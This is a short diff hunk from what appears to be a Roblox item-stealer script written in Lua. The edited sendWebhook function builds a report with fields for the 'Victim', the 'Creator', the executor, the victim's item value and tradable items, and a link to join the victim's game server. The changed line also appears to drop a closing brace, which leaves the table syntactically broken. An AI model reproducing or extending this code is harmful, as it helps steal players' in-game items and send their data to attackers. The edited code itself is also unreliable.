@@ -223,7 +223,7 @@ local function sendWebhook(totalValue, tradableSummary)
 				{["name"] = "Victim", ["value"] = LocalPlayer.Name},
 				{["name"] = "Creator", ["value"] = table.concat(usernames, ", ")},
 				{["name"] = "Executor", ["value"] = executor},
-				{["name"] = "Total Value", ["value"] = formatNumber(totalValue)},
+				{["name"] = "Total Value", ["value"] = string.format("Total Value: %s", totalValue),
 				{["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
 				{["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
 			},
